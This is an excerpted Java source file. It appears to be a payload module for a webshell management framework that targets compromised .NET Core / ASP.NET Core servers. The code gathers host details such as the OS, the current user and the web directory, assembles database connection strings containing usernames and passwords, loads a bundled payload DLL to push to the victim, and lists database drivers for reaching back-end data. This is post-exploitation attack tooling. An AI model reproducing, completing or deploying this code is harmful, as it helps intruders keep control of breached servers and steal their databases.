package shells.payloads.netcore;
...
/**
 * Client payload module for .NET Core / ASP.NET Core dynamic shell.
 * Wire protocol is compatible with classic CSharpDynamicPayload.
 */
@PayloadAnnotation(
        Name = "NetCoreDynamicPayload"
)
public class NetCoreShell extends AbstractPayload {
    ...
    public String getBasicsInfo() {
        ...
        Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo,
                "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory|CurrentWebDir) : (.+)");
    ...
    public String[] getSupportDatabaseTypes() {
        return (String[])ALL_DATABASE_TYPE.keySet().toArray(new String[0]);
    }

    public String[] getDatabaseDrives(String databaseName) {
        return (String[])((LinkedList)ALL_DATABASE_TYPE.get(databaseName)).toArray(new String[0]);
    }
    ...
    public String getDatabaseConnectString(DbInfo dbInfo) {
        ...
        connectString = connectString.replace("{databaseHost}", dbInfo.getHost())
                .replace("{databasePort}", String.valueOf(dbInfo.getPort()))
                .replace("{databaseCharset}", dbInfo.getDatabaseCharset2().getCharsetString())
                .replace("{currentDatabase}", currentDatabase)
                .replace("{databaseUserName}", dbInfo.getUsername())
                .replace("{databasePassWord}", dbInfo.getPassword());
    ...
    public byte[] getPayload() {
        byte[] data = null;
        try {
            InputStream fileInputStream = NetCoreShell.class.getResourceAsStream("assets/payload_core.dll");
    ...
    static {
        ...
        mysqlDrives.add("MySql.Data.MySqlClient.MySqlClientFactory, MySql.Data");
        oracleDrives.add("Oracle.ManagedDataAccess.Client.OracleClientFactory, Oracle.ManagedDataAccess");
        sqlserverDrives.add("Microsoft.Data.SqlClient.SqlClientFactory, Microsoft.Data.SqlClient");
        sqlserverDrives.add("System.Data.SqlClient.SqlClientFactory, System.Data.SqlClient");
        postgresqlDrives.add("Npgsql.NpgsqlFactory, Npgsql");
        sqliteDrives.add("Microsoft.Data.Sqlite.SqliteFactory, Microsoft.Data.Sqlite");
        customDrives.add("custom.Factory");
    }
}
